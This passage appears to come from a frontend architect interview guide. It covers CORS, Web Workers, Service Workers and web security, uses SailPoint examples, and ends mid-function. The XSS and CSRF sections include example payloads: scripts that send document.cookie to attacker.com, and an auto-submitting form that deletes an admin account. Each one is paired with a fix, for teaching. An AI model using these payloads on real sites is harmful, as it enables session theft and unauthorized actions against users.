https://identitynow.sailpoint.com → https://api.sailpoint.com
// ❌ Different subdomain

https://identitynow.sailpoint.com:443 → https://identitynow.sailpoint.com:8080
// ❌ Different port
```

**CORS Request Types:**

**1. Simple Requests** (no preflight)

```javascript
// Conditions for simple request:
// - Method: GET, HEAD, or POST
// - Headers: Accept, Accept-Language, Content-Language, Content-Type
// - Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain

// Example: Simple GET request
fetch('https://api.sailpoint.com/v3/identities', {
  method: 'GET',
  headers: {
    'Accept': 'application/json'
  }
});

// Browser sends:
GET /v3/identities HTTP/1.1
Host: api.sailpoint.com
Origin: https://identitynow.sailpoint.com
Accept: application/json

// Server responds:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://identitynow.sailpoint.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{ "identities": [...] }
```

**2. Preflight Requests** (OPTIONS request first)

```javascript
// Triggers preflight if:
// - Method: PUT, DELETE, PATCH, etc.
// - Custom headers: Authorization, X-Custom-Header
// - Content-Type: application/json

// Example: Request with Authorization header
fetch('https://api.sailpoint.com/v3/identities', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer token123'
  },
  body: JSON.stringify({ name: 'John Doe' })
});

// Step 1: Browser sends preflight (OPTIONS)
OPTIONS /v3/identities HTTP/1.1
Host: api.sailpoint.com
Origin: https://identitynow.sailpoint.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, authorization

// Step 2: Server responds to preflight
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://identitynow.sailpoint.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
Access-Control-Allow-Credentials: true

// Step 3: Browser sends actual request
POST /v3/identities HTTP/1.1
Host: api.sailpoint.com
Origin: https://identitynow.sailpoint.com
Content-Type: application/json
Authorization: Bearer token123

{ "name": "John Doe" }

// Step 4: Server responds
HTTP/1.1 201 Created
Access-Control-Allow-Origin: https://identitynow.sailpoint.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{ "id": "id-123", "name": "John Doe" }
```

**CORS Headers Explained:**

```
Response Headers (Server → Browser):

Access-Control-Allow-Origin: https://identitynow.sailpoint.com
  - Specifies allowed origin
  - Can be "*" (wildcard, but not with credentials)
  - Cannot be multiple origins (use dynamic value)

Access-Control-Allow-Methods: GET, POST, PUT, DELETE
  - Allowed HTTP methods
  - Used in preflight response

Access-Control-Allow-Headers: Content-Type, Authorization, X-Custom
  - Allowed request headers
  - Used in preflight response

Access-Control-Allow-Credentials: true
  - Allows cookies and Authorization header
  - Origin cannot be "*" when true

Access-Control-Max-Age: 86400
  - Preflight cache duration (seconds)
  - 86400 = 24 hours

Access-Control-Expose-Headers: X-Total-Count, X-Page-Number
  - Headers exposed to JavaScript
  - By default, only simple headers are exposed

Request Headers (Browser → Server):

Origin: https://identitynow.sailpoint.com
  - Automatically added by browser
  - Cannot be modified by JavaScript

Access-Control-Request-Method: POST
  - Used in preflight
  - Indicates actual request method

Access-Control-Request-Headers: content-type, authorization
  - Used in preflight
  - Indicates actual request headers
```

**Server-Side CORS Configuration:**

```javascript
// Node.js/Express
const cors = require('cors');

// Option 1: Allow all origins (development only!)
app.use(cors());

// Option 2: Specific origin
app.use(cors({
  origin: 'https://identitynow.sailpoint.com',
  credentials: true
}));

// Option 3: Multiple origins
const allowedOrigins = [
  'https://identitynow.sailpoint.com',
  'https://identityiq.sailpoint.com',
  'http://localhost:4200'
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID'],
  exposedHeaders: ['X-Total-Count', 'X-Page-Number'],
  maxAge: 86400
}));

// Option 4: Manual CORS headers
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }
  
  next();
});
```

**Common CORS Errors:**

```javascript
// Error 1: No 'Access-Control-Allow-Origin' header
// Browser console:
// "Access to fetch at 'https://api.sailpoint.com' from origin 
// 'https://identitynow.sailpoint.com' has been blocked by CORS policy: 
// No 'Access-Control-Allow-Origin' header is present"

// Solution: Add CORS header on server
res.setHeader('Access-Control-Allow-Origin', 'https://identitynow.sailpoint.com');

// Error 2: Wildcard with credentials
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');
// ❌ Error: Cannot use wildcard with credentials

// Solution: Specify exact origin
res.setHeader('Access-Control-Allow-Origin', req.headers.origin);

// Error 3: Preflight failure
// "Method PUT is not allowed by Access-Control-Allow-Methods"

// Solution: Add method to allowed methods
res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');

// Error 4: Custom header not allowed
// "Request header field authorization is not allowed"

// Solution: Add header to allowed headers
res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
```

**CORS Workarounds (Not Recommended):**

```javascript
// ❌ Workaround 1: Proxy server (development only)
// webpack.config.js
module.exports = {
  devServer: {
    proxy: {
      '/api': {
        target: 'https://api.sailpoint.com',
        changeOrigin: true,
        pathRewrite: { '^/api': '' }
      }
    }
  }
};

// ❌ Workaround 2: JSONP (legacy, security risk)
function jsonp(url, callback) {
  const script = document.createElement('script');
  script.src = `${url}?callback=${callback}`;
  document.body.appendChild(script);
}

// ❌ Workaround 3: Browser extension (development only)
// Install "CORS Unblock" extension (disables CORS in browser)

// ✅ Proper Solution: Configure CORS on server!
```

**CORS with Credentials:**

```javascript
// Client-side: Include credentials
fetch('https://api.sailpoint.com/v3/identities', {
  method: 'GET',
  credentials: 'include', // Send cookies
  headers: {
    'Authorization': 'Bearer token123'
  }
});

// XMLHttpRequest
const xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open('GET', 'https://api.sailpoint.com/v3/identities');
xhr.send();

// Server-side: Allow credentials
res.setHeader('Access-Control-Allow-Origin', 'https://identitynow.sailpoint.com');
res.setHeader('Access-Control-Allow-Credentials', 'true');
// Note: Origin cannot be "*" when credentials are allowed
```

**SailPoint Context:**

```javascript
// IdentityNow CORS Configuration
// Main app: https://identitynow.sailpoint.com
// API: https://api.identitynow.sailpoint.com

// API server CORS config:
const allowedOrigins = [
  'https://identitynow.sailpoint.com',
  'https://identitynow-dev.sailpoint.com',
  'https://identitynow-staging.sailpoint.com',
  'http://localhost:4200' // Development
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true, // Allow cookies for session management
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID'],
  exposedHeaders: ['X-Total-Count', 'X-RateLimit-Remaining'],
  maxAge: 86400 // Cache preflight for 24 hours
}));
```

---

## 3. Web APIs & Browser Features

### Q3.1: Explain Web Workers and when to use them

**Architect-Level Answer:**

Web Workers run JavaScript in background threads, separate from the main UI thread, enabling true parallelism.

**Types of Workers:**

```
1. Dedicated Workers: One-to-one with creating script
2. Shared Workers: Shared across multiple scripts/tabs
3. Service Workers: Network proxy for PWAs (covered separately)
```

**Dedicated Worker Example:**

```javascript
// main.js (Main Thread)
const worker = new Worker('worker.js');

// Send data to worker
worker.postMessage({
  action: 'processIdentities',
  identities: largeIdentityArray // 100,000 items
});

// Receive results from worker
worker.onmessage = (event) => {
  const { action, result } = event.data;
  
  if (action === 'progress') {
    updateProgressBar(result.percent);
  } else if (action === 'complete') {
    displayResults(result.data);
  }
};

// Handle errors
worker.onerror = (error) => {
  console.error('Worker error:', error.message);
};

// Terminate worker
worker.terminate();
```

```javascript
// worker.js (Worker Thread)
self.onmessage = (event) => {
  const { action, identities } = event.data;
  
  if (action === 'processIdentities') {
    const results = [];
    const total = identities.length;
    
    for (let i = 0; i < total; i++) {
      // Heavy computation
      const processed = complexCalculation(identities[i]);
      results.push(processed);
      
      // Report progress every 1000 items
      if (i % 1000 === 0) {
        self.postMessage({
          action: 'progress',
          result: { percent: (i / total) * 100 }
        });
      }
    }
    
    // Send final results
    self.postMessage({
      action: 'complete',
      result: { data: results }
    });
  }
};

function complexCalculation(identity) {
  // CPU-intensive operation
  let riskScore = 0;
  for (let i = 0; i < 1000000; i++) {
    riskScore += Math.sqrt(i) * identity.accessCount;
  }
  return { ...identity, riskScore };
}
```

**Worker Limitations:**

```javascript
// ❌ Cannot access in workers:
// - DOM (document, window)
// - Parent page variables
// - localStorage, sessionStorage

// ✅ Can access in workers:
// - fetch API
// - IndexedDB
// - WebSockets
// - setTimeout, setInterval
// - importScripts() for loading libraries
// - navigator, location (read-only)
// - console
```

**Transferable Objects (Zero-Copy):**

```javascript
// ❌ Slow: Structured clone (copies data)
const largeArray = new Uint8Array(10000000); // 10MB
worker.postMessage({ data: largeArray });
// Copies 10MB, takes ~50ms

// ✅ Fast: Transfer ownership (zero-copy)
const largeArray = new Uint8Array(10000000); // 10MB
worker.postMessage({ data: largeArray }, [largeArray.buffer]);
// Transfers ownership, takes ~1ms
// Note: largeArray is now unusable in main thread!

// Transferable types:
// - ArrayBuffer
// - MessagePort
// - ImageBitmap
// - OffscreenCanvas
```

**Shared Worker Example:**

```javascript
// shared-worker.js
const connections = [];

self.onconnect = (event) => {
  const port = event.ports[0];
  connections.push(port);
  
  port.onmessage = (e) => {
    // Broadcast to all connected tabs
    connections.forEach(conn => {
      conn.postMessage({
        type: 'broadcast',
        data: e.data
      });
    });
  };
};

// tab1.js
const sharedWorker = new SharedWorker('shared-worker.js');
sharedWorker.port.start();

sharedWorker.port.postMessage({ action: 'update', value: 42 });

sharedWorker.port.onmessage = (event) => {
  console.log('Received from other tab:', event.data);
};

// tab2.js (same code, receives messages from tab1)
```

**Real-World Use Cases:**

```javascript
// Use Case 1: Large Data Processing
// Process 100,000 identity records without blocking UI
const worker = new Worker('data-processor.js');
worker.postMessage({ identities: largeDataset });

// Use Case 2: Image Processing
// Apply filters to images without freezing UI
const imageWorker = new Worker('image-processor.js');
imageWorker.postMessage({ imageData, filter: 'blur' });

// Use Case 3: Encryption/Decryption
// Encrypt sensitive data without blocking
const cryptoWorker = new Worker('crypto-worker.js');
cryptoWorker.postMessage({ action: 'encrypt', data: sensitiveData });

// Use Case 4: Real-time Data Parsing
// Parse large CSV/JSON files
const parserWorker = new Worker('parser-worker.js');
parserWorker.postMessage({ file: largeCSVFile });

// Use Case 5: Background Sync
// Sync data with server in background
const syncWorker = new Worker('sync-worker.js');
syncWorker.postMessage({ action: 'sync', data: offlineChanges });
```

**Worker Pool Pattern:**

```javascript
class WorkerPool {
  constructor(workerScript, poolSize = navigator.hardwareConcurrency || 4) {
    this.workers = [];
    this.taskQueue = [];
    this.availableWorkers = [];
    
    for (let i = 0; i < poolSize; i++) {
      const worker = new Worker(workerScript);
      worker.onmessage = (event) => this.handleWorkerMessage(worker, event);
      this.workers.push(worker);
      this.availableWorkers.push(worker);
    }
  }
  
  execute(data) {
    return new Promise((resolve, reject) => {
      const task = { data, resolve, reject };
      
      if (this.availableWorkers.length > 0) {
        this.runTask(task);
      } else {
        this.taskQueue.push(task);
      }
    });
  }
  
  runTask(task) {
    const worker = this.availableWorkers.pop();
    worker.currentTask = task;
    worker.postMessage(task.data);
  }
  
  handleWorkerMessage(worker, event) {
    const task = worker.currentTask;
    task.resolve(event.data);
    
    // Return worker to pool
    this.availableWorkers.push(worker);
    
    // Process next task
    if (this.taskQueue.length > 0) {
      this.runTask(this.taskQueue.shift());
    }
  }
  
  terminate() {
    this.workers.forEach(worker => worker.terminate());
  }
}

// Usage
const pool = new WorkerPool('processor.js', 4);

// Process tasks in parallel
const tasks = identities.map(identity => 
  pool.execute({ action: 'process', identity })
);

const results = await Promise.all(tasks);
console.log('All tasks complete:', results);
```

**SailPoint Context:**

```javascript
// IdentityNow: Process certification campaign data
// Main thread: UI remains responsive
// Worker thread: Calculate risk scores for 50,000 identities

// certification-worker.js
self.onmessage = (event) => {
  const { identities, entitlements, accessHistory } = event.data;
  
  const results = identities.map(identity => {
    // Complex risk calculation
    const riskScore = calculateRiskScore(identity, entitlements, accessHistory);
    const recommendations = generateRecommendations(identity, riskScore);
    
    return {
      identityId: identity.id,
      riskScore,
      recommendations
    };
  });
  
  self.postMessage({ results });
};

// main.js
const worker = new Worker('certification-worker.js');
worker.postMessage({
  identities: allIdentities,
  entitlements: allEntitlements,
  accessHistory: accessHistoryData
});

worker.onmessage = (event) => {
  renderCertificationDashboard(event.data.results);
};
```

---

### Q3.2: Explain Service Workers and PWA concepts

**Architect-Level Answer:**

Service Workers are scripts that run in the background, separate from web pages, enabling features like offline support, push notifications, and background sync.

**Service Worker Lifecycle:**

```
1. Registration → 2. Installation → 3. Activation → 4. Idle/Terminated → 5. Fetch/Message
```

**Registration:**

```javascript
// main.js
if ('serviceWorker' in navigator) {
  window.addEventListener('load', async () => {
    try {
      const registration = await navigator.serviceWorker.register('/sw.js', {
        scope: '/' // Controls which pages SW handles
      });
      
      console.log('SW registered:', registration.scope);
      
      // Check for updates
      registration.addEventListener('updatefound', () => {
        const newWorker = registration.installing;
        console.log('New SW installing...');
        
        newWorker.addEventListener('statechange', () => {
          if (newWorker.state === 'installed' && navigator.serviceWorker.controller) {
            // New SW available, prompt user to refresh
            showUpdateNotification();
          }
        });
      });
    } catch (error) {
      console.error('SW registration failed:', error);
    }
  });
}
```

**Installation:**

```javascript
// sw.js
const CACHE_NAME = 'identitynow-v1.0.0';
const urlsToCache = [
  '/',
  '/index.html',
  '/styles/main.css',
  '/scripts/app.js',
  '/images/logo.png',
  '/offline.html'
];

self.addEventListener('install', (event) => {
  console.log('SW installing...');
  
  event.waitUntil(
    caches.open(CACHE_NAME)
      .then(cache => {
        console.log('Caching app shell');
        return cache.addAll(urlsToCache);
      })
      .then(() => {
        // Force activation immediately
        return self.skipWaiting();
      })
  );
});
```

**Activation:**

```javascript
self.addEventListener('activate', (event) => {
  console.log('SW activating...');
  
  event.waitUntil(
    // Delete old caches
    caches.keys().then(cacheNames => {
      return Promise.all(
        cacheNames.map(cacheName => {
          if (cacheName !== CACHE_NAME) {
            console.log('Deleting old cache:', cacheName);
            return caches.delete(cacheName);
          }
        })
      );
    }).then(() => {
      // Take control of all clients immediately
      return self.clients.claim();
    })
  );
});
```

**Fetch Interception (Caching Strategies):**

```javascript
// Strategy 1: Cache First (offline-first)
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request)
      .then(cachedResponse => {
        if (cachedResponse) {
          return cachedResponse; // Return cached version
        }
        
        // Not in cache, fetch from network
        return fetch(event.request).then(response => {
          // Cache the new response
          return caches.open(CACHE_NAME).then(cache => {
            cache.put(event.request, response.clone());
            return response;
          });
        });
      })
      .catch(() => {
        // Network failed, return offline page
        return caches.match('/offline.html');
      })
  );
});

// Strategy 2: Network First (fresh data priority)
self.addEventListener('fetch', (event) => {
  event.respondWith(
    fetch(event.request)
      .then(response => {
        // Update cache with fresh data
        caches.open(CACHE_NAME).then(cache => {
          cache.put(event.request, response.clone());
        });
        return response;
      })
      .catch(() => {
        // Network failed, fallback to cache
        return caches.match(event.request);
      })
  );
});

// Strategy 3: Stale While Revalidate
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request).then(cachedResponse => {
      const fetchPromise = fetch(event.request).then(networkResponse => {
        caches.open(CACHE_NAME).then(cache => {
          cache.put(event.request, networkResponse.clone());
        });
        return networkResponse;
      });
      
      // Return cached version immediately, update in background
      return cachedResponse || fetchPromise;
    })
  );
});

// Strategy 4: Network Only (always fresh)
self.addEventListener('fetch', (event) => {
  event.respondWith(fetch(event.request));
});

// Strategy 5: Cache Only (static assets)
self.addEventListener('fetch', (event) => {
  event.respondWith(caches.match(event.request));
});
```

**Advanced Caching Strategy:**

```javascript
// Route-based caching strategies
self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url);
  
  // API requests: Network First
  if (url.pathname.startsWith('/api/')) {
    event.respondWith(networkFirst(event.request));
  }
  // Static assets: Cache First
  else if (url.pathname.match(/\.(css|js|png|jpg|svg)$/)) {
    event.respondWith(cacheFirst(event.request));
  }
  // HTML pages: Stale While Revalidate
  else {
    event.respondWith(staleWhileRevalidate(event.request));
  }
});

async function cacheFirst(request) {
  const cached = await caches.match(request);
  if (cached) return cached;
  
  const response = await fetch(request);
  const cache = await caches.open(CACHE_NAME);
  cache.put(request, response.clone());
  return response;
}

async function networkFirst(request) {
  try {
    const response = await fetch(request);
    const cache = await caches.open(CACHE_NAME);
    cache.put(request, response.clone());
    return response;
  } catch (error) {
    const cached = await caches.match(request);
    if (cached) return cached;
    throw error;
  }
}

async function staleWhileRevalidate(request) {
  const cached = await caches.match(request);
  
  const fetchPromise = fetch(request).then(response => {
    caches.open(CACHE_NAME).then(cache => {
      cache.put(request, response.clone());
    });
    return response;
  });
  
  return cached || fetchPromise;
}
```

**Background Sync:**

```javascript
// Register sync in main thread
navigator.serviceWorker.ready.then(registration => {
  return registration.sync.register('sync-identities');
});

// Handle sync in service worker
self.addEventListener('sync', (event) => {
  if (event.tag === 'sync-identities') {
    event.waitUntil(syncIdentities());
  }
});

async function syncIdentities() {
  // Get pending changes from IndexedDB
  const db = await openDB('identitynow-offline');
  const pendingChanges = await db.getAll('pending-changes');
  
  // Sync with server
  for (const change of pendingChanges) {
    try {
      await fetch('/api/identities', {
        method: 'POST',
        body: JSON.stringify(change),
        headers: { 'Content-Type': 'application/json' }
      });
      
      // Remove from pending
      await db.delete('pending-changes', change.id);
    } catch (error) {
      console.error('Sync failed:', error);
      // Will retry on next sync event
    }
  }
}
```

**Push Notifications:**

```javascript
// Request permission
const permission = await Notification.requestPermission();
if (permission === 'granted') {
  // Subscribe to push
  const registration = await navigator.serviceWorker.ready;
  const subscription = await registration.pushManager.subscribe({
    userVisibleOnly: true,
    applicationServerKey: urlBase64ToUint8Array(publicVapidKey)
  });
  
  // Send subscription to server
  await fetch('/api/push/subscribe', {
    method: 'POST',
    body: JSON.stringify(subscription),
    headers: { 'Content-Type': 'application/json' }
  });
}

// Handle push in service worker
self.addEventListener('push', (event) => {
  const data = event.data.json();
  
  event.waitUntil(
    self.registration.showNotification(data.title, {
      body: data.body,
      icon: '/images/icon-192.png',
      badge: '/images/badge-72.png',
      data: { url: data.url },
      actions: [
        { action: 'open', title: 'Open' },
        { action: 'close', title: 'Close' }
      ]
    })
  );
});

// Handle notification click
self.addEventListener('notificationclick', (event) => {
  event.notification.close();
  
  if (event.action === 'open') {
    event.waitUntil(
      clients.openWindow(event.notification.data.url)
    );
  }
});
```

**PWA Manifest:**

```json
// manifest.json
{
  "name": "SailPoint IdentityNow",
  "short_name": "IdentityNow",
  "description": "Identity Governance and Administration",
  "start_url": "/",
  "display": "standalone",
  "background_color": "#003d5c",
  "theme_color": "#003d5c",
  "orientation": "portrait-primary",
  "icons": [
    {
      "src": "/images/icon-72.png",
      "sizes": "72x72",
      "type": "image/png"
    },
    {
      "src": "/images/icon-192.png",
      "sizes": "192x192",
      "type": "image/png",
      "purpose": "any maskable"
    },
    {
      "src": "/images/icon-512.png",
      "sizes": "512x512",
      "type": "image/png"
    }
  ],
  "shortcuts": [
    {
      "name": "Certifications",
      "url": "/certifications",
      "icons": [{ "src": "/images/cert-icon.png", "sizes": "96x96" }]
    },
    {
      "name": "Access Requests",
      "url": "/access-requests",
      "icons": [{ "src": "/images/access-icon.png", "sizes": "96x96" }]
    }
  ]
}
```

```html
<!-- index.html -->
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="#003d5c">
<link rel="apple-touch-icon" href="/images/icon-192.png">
```

**SailPoint Context:**

```javascript
// IdentityNow PWA Features:

// 1. Offline certification reviews
// Cache certification data for offline access
// Sync decisions when back online

// 2. Push notifications for:
// - Pending access requests
// - Certification deadlines
// - Policy violations

// 3. Background sync for:
// - Offline access request submissions
// - Certification decisions
// - Identity updates

// 4. Install as app:
// - Desktop shortcut
// - Mobile home screen
// - Standalone window (no browser chrome)
```

---

## 4. Web Security

### Q4.1: Explain XSS (Cross-Site Scripting) attacks and prevention

**Architect-Level Answer:**

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

**Types of XSS:**

**1. Stored XSS (Persistent)**

```javascript
// Attacker submits malicious comment
const comment = `
  Great article! 
  <script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
  </script>
`;

// Vulnerable code: Directly renders user input
function renderComment(comment) {
  document.getElementById('comments').innerHTML += `
    <div class="comment">${comment}</div>
  `;
}
// When other users view the page, the script executes!

// ✅ Prevention: Sanitize and escape
function renderCommentSafe(comment) {
  const div = document.createElement('div');
  div.className = 'comment';
  div.textContent = comment; // Automatically escapes HTML
  document.getElementById('comments').appendChild(div);
}

// Or use DOMPurify library
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(comment);
```

**2. Reflected XSS (Non-Persistent)**

```javascript
// Attacker sends malicious URL
// https://identitynow.sailpoint.com/search?q=<script>alert(document.cookie)</script>

// Vulnerable code: Reflects user input in response
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Search results for: ${query}</h1>`);
  // Script executes when victim clicks malicious link!
});

// ✅ Prevention: Escape output
app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h1>Search results for: ${query}</h1>`);
});

function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
```

**3. DOM-based XSS**

```javascript
// Vulnerable code: Uses user input in DOM manipulation
const username = location.hash.substring(1); // #<img src=x onerror=alert(1)>
document.getElementById('welcome').innerHTML = `Welcome ${username}!`;
// Script executes without server involvement!

// ✅ Prevention: Use textContent or sanitize
const username = location.hash.substring(1);
document.getElementById('welcome').textContent = `Welcome ${username}!`;

// Or validate input
const username = location.hash.substring(1);
if (/^[a-zA-Z0-9]+$/.test(username)) {
  document.getElementById('welcome').textContent = `Welcome ${username}!`;
}
```

**XSS Prevention Strategies:**

```javascript
// 1. Content Security Policy (CSP)
// HTTP Header:
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' https://cdn.sailpoint.com; 
  style-src 'self' 'unsafe-inline'; 
  img-src 'self' data: https:; 
  connect-src 'self' https://api.sailpoint.com;
  frame-ancestors 'none';

// HTML Meta tag:
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' https://cdn.sailpoint.com">

// 2. Input Validation
function validateUsername(username) {
  // Whitelist approach
  if (!/^[a-zA-Z0-9_-]{3,20}$/.test(username)) {
    throw new Error('Invalid username');
  }
  return username;
}

// 3. Output Encoding
// HTML context
function encodeHTML(str) {
  return str.replace(/[&<>"']/g, char => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;'
  })[char]);
}

// JavaScript context
function encodeJS(str) {
  return str.replace(/[\\'"]/g, '\\$&');
}

// URL context
function encodeURL(str) {
  return encodeURIComponent(str);
}

// 4. Use Framework Protection
// React automatically escapes
const username = '<script>alert(1)</script>';
return <div>{username}</div>; // Renders as text, not script

// Angular automatically sanitizes
@Component({
  template: `<div>{{username}}</div>` // Safe
})

// Vue automatically escapes
<template>
  <div>{{ username }}</div> <!-- Safe -->
</template>

// 5. Sanitize HTML (when you need to allow some HTML)
import DOMPurify from 'dompurify';

const dirty = '<p>Hello <script>alert(1)</script></p>';
const clean = DOMPurify.sanitize(dirty);
// Result: '<p>Hello </p>'

// Allow specific tags
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});

// 6. HTTPOnly Cookies
// Prevents JavaScript access to cookies
res.cookie('session', token, {
  httpOnly: true,  // Cannot be accessed by document.cookie
  secure: true,    // Only sent over HTTPS
  sameSite: 'strict' // CSRF protection
});

// 7. X-XSS-Protection Header (legacy, use CSP instead)
X-XSS-Protection: 1; mode=block
```

**Real-World XSS Example:**

```javascript
// Vulnerable: Identity search feature
function searchIdentities(query) {
  fetch(`/api/search?q=${query}`)
    .then(r => r.json())
    .then(results => {
      document.getElementById('results').innerHTML = `
        <h2>Results for: ${query}</h2>
        ${results.map(r => `<div>${r.name}</div>`).join('')}
      `;
    });
}

// Attacker uses: <img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>

// ✅ Secure version
function searchIdentitiesSafe(query) {
  // 1. Validate input
  if (!/^[a-zA-Z0-9\s]{1,50}$/.test(query)) {
    throw new Error('Invalid search query');
  }
  
  // 2. Encode for URL
  const encodedQuery = encodeURIComponent(query);
  
  fetch(`/api/search?q=${encodedQuery}`)
    .then(r => r.json())
    .then(results => {
      const container = document.getElementById('results');
      container.innerHTML = ''; // Clear
      
      // 3. Use textContent (not innerHTML)
      const title = document.createElement('h2');
      title.textContent = `Results for: ${query}`;
      container.appendChild(title);
      
      // 4. Safely render results
      results.forEach(result => {
        const div = document.createElement('div');
        div.textContent = result.name;
        container.appendChild(div);
      });
    });
}
```

**SailPoint Context:**

```javascript
// IdentityNow XSS Prevention:

// 1. User profile display
// ❌ Vulnerable
<div innerHTML={identity.displayName}></div>

// ✅ Secure
<div>{identity.displayName}</div> // React escapes automatically

// 2. Certification comments
// ❌ Vulnerable
comments.forEach(c => {
  container.innerHTML += `<p>${c.text}</p>`;
});

// ✅ Secure
import DOMPurify from 'dompurify';
comments.forEach(c => {
  const p = document.createElement('p');
  p.textContent = c.text;
  container.appendChild(p);
});

// 3. CSP Header for IdentityNow
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://cdn.identitynow.sailpoint.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.identitynow.sailpoint.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

---

### Q4.2: Explain CSRF (Cross-Site Request Forgery) and prevention

**Architect-Level Answer:**

CSRF tricks authenticated users into executing unwanted actions on a web application.

**How CSRF Works:**

```html
<!-- Attacker's malicious website -->
<html>
<body>
  <h1>You won a prize! Click here!</h1>
  
  <!-- Hidden form that submits to victim site -->
  <form id="attack" action="https://identitynow.sailpoint.com/api/users/delete" method="POST">
    <input type="hidden" name="userId" value="admin">
  </form>
  
  <script>
    // Auto-submit when page loads
    document.getElementById('attack').submit();
  </script>
</body>
</html>

<!-- If user is logged into IdentityNow, their session cookie is sent automatically!
     The delete request succeeds because browser includes authentication cookies. -->
```

**CSRF Attack Scenarios:**

```javascript
// Scenario 1: State-changing GET request (bad practice!)
// ❌ Vulnerable
app.get('/api/users/:id/delete', (req, res) => {
  deleteUser(req.params.id);
  res.send('User deleted');
});

// Attacker embeds:
<img src="https://identitynow.sailpoint.com/api/users/admin/delete">
// User's browser sends request with cookies!

// Scenario 2: POST request without CSRF protection
// ❌ Vulnerable
app.post('/api/users/delete', (req, res) => {
  deleteUser(req.body.userId);
  res.send('User deleted');
});

// Attacker creates form (shown above)

// Scenario 3: JSON API without CSRF protection
// ❌ Vulnerable
fetch('https://identitynow.sailpoint.com/api/users/delete', {
  method: 'POST',
  credentials: 'include', // Sends cookies
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ userId: 'admin' })
});
```

**CSRF Prevention Strategies:**

**1. CSRF Tokens (Synchronizer Token Pattern)**

```javascript
// Server generates unique token per session
app.get('/form', (req, res) => {
  const csrfToken = generateCSRFToken();
  req.session.csrfToken = csrfToken;
  
  res.send(`
    <form action="/api/users/delete" method="POST">
      <input type="hidden" name="_csrf" value="${csrfToken}">
      <input type="text" name="userId">
      <button type="submit">Delete</button>
    </form>
  `);
});

// Server validates token on submission
app.post('/api/users/delete', (req, res) => {
  const submittedToken = req.body._csrf;
  const sessionToken = req.session.csrfToken;
  
  if (!submittedToken || submittedToken !== sessionToken) {
    return res.status(403).send('CSRF token validation failed');
  }
  
  deleteUser(req.body.userId);
  res.send('User deleted');
});

// Client-side (SPA)
// Store token in meta tag
<meta name="csrf-token" content="abc123xyz">

// Read and include in requests
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

fetch('/api/users/delete', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({ userId: 'admin' })
});
```

**2. SameSite Cookie Attribute**

```javascript
// Set SameSite attribute on session cookie
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict' // or 'lax'
});

// SameSite=Strict: Cookie never sent on cross-site requests
// SameSite=Lax: Cookie sent on top-level navigation (GET only)
// SameSite=None: Cookie sent on all requests (requires Secure)

// Example:
// User on attacker.com clicks link to identitynow.sailpoint.com
// - Strict: No cookie sent
// - Lax: Cookie sent (safe for GET)
// - None: Cookie sent (vulnerable)
```

**3. Double Submit Cookie Pattern**

```javascript
// Server sets CSRF token in cookie
res.cookie('csrf-token', csrfToken, {
  httpOnly: false, // JavaScript can read it
  secure: true,
  sameSite: 'strict'
});

// Client reads cookie and sends in header
function getCookie(name) {
  const value = `; ${document.cookie}`;
